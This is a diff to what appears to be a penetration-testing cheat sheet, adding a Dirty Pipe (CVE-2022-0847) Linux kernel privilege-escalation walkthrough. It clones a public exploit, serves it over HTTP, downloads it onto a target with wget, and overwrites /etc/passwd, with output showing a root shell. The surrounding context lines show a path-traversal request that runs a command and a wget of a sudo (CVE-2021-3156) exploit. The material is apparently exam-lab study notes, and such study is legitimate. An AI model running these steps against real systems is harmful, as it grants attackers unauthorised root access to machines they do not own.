@@ -1631,6 +1631,24 @@ curl 127.0.0.1:8000
 127.0.0.1:8000/backend/?view=../../../../../var/crash/test.php&cmd=id
 ````
 ### Kernel Expoits
+#### CVE-2022-0847
+````
+git clone https://github.com/Al1ex/CVE-2022-0847.git
+cd CVE-2022-0847
+python3 -m http.server 80
+````
+````
+wget http://192.168.45.191:80/exp
+chmod +x exp
+cp /etc/passwd /tmp/passwd.bak
+john@oscp:~$ ./exp /etc/passwd 1 ootz:
+It worked!
+john@oscp:~$ su rootz
+rootz@oscp:/home/john# whoami
+rootz
+rootz@oscp:/home/john# id
+uid=0(rootz) gid=0(root) groups=0(root)
+````
 #### CVE-2021-3156
 ````
 wget https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py
